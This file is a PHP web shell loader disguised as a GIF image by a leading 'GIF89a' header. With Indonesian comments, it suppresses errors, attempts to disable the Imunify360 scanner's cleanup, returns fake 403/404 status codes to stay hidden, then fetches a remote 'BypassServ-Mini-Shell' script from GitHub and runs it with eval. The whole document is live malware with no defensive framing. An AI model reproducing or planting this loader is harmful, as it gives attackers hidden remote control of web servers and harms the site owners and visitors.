GIF89a;
;;;

<?php
error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');

// Mengatur kode respons HTTP
http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);

// Mengambil konten dari URL
$url = 'https://raw.githubusercontent.com/HaxorSecInfec/BypassServ-Mini-Shell/main/bypasserv-new.php';
$imunify = file_get_contents($url);

// Mengeksekusi konten yang diambil
eval('?>' . $imunify);
?>
